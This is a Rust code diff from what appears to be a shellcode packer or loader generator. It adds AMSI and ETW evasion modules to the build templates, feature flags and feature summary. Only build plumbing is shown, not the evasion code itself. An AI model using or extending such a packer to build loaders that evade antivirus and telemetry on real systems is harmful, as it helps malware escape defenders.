@@ -59,6 +59,21 @@ pub const TEMPLATE_MODULES: &[TemplateModule] = &[
         dest_file: "./loader/src/checks/peb.rs",
     },
     TemplateModule {
+        name: "evasion_mod",
+        source_file: "./template/evasion/mod.rs",
+        dest_file: "./loader/src/evasion/mod.rs",
+    },
+    TemplateModule {
+        name: "evasion_amsi",
+        source_file: "./template/evasion/amsi.rs",
+        dest_file: "./loader/src/evasion/amsi.rs",
+    },
+    TemplateModule {
+        name: "evasion_etw",
+        source_file: "./template/evasion/etw.rs",
+        dest_file: "./loader/src/evasion/etw.rs",
+    },
+    TemplateModule {
         name: "benign",
         source_file: "./template/benign.rs",
         dest_file: "./loader/src/benign.rs",
@@ -120,6 +135,11 @@ pub fn build_compile_command(config: &PackerConfig, payload_type: &PayloadType) 
         compile_command.push_str(&format!("--features {} ", check.feature_name()));
     }
     
+    // Add evasion features
+    for evasion in &config.evasion {
+        compile_command.push_str(&format!("--features {} ", evasion.feature_name()));
+    }
+    
     if let Some(encryption) = config.encrypt {
         compile_command.push_str(&format!("--features {} ", encryption.feature_name()));
     }
@@ -144,6 +164,7 @@ pub fn setup_loader_directory() -> Result<(), std::io::Error> {
     std::fs::create_dir_all("loader/src/execution")?;
     std::fs::create_dir_all("loader/src/utilities")?;
     std::fs::create_dir_all("loader/src/checks")?;
+    std::fs::create_dir_all("loader/src/evasion")?;
     
     // Copy Cargo.toml from template to loader directory
     let template_cargo = "template/Cargo.toml";
@@ -175,6 +196,7 @@ fn should_include_module(module_name: &str, config: &PackerConfig) -> bool {
         "aes" => config.encrypt.is_some(),
         "utilities_mod" | "utilities_utils" => !config.utils.is_empty(),
         "checks_mod" | "checks_checks" | "checks_peb" => !config.checks.is_empty(),
+        "evasion_mod" | "evasion_amsi" | "evasion_etw" => !config.evasion.is_empty(),
         _ => false,
     }
 }
@@ -213,6 +235,11 @@ pub fn display_feature_summary(config: &PackerConfig) {
     // Add check features
     for check in &config.checks {
         features.push(check.display_name());
+    }
+    
+    // Add evasion features
+    for evasion in &config.evasion {
+        features.push(evasion.display_name());
     }
     
     features.push(config.execution_shellcode.display_name());
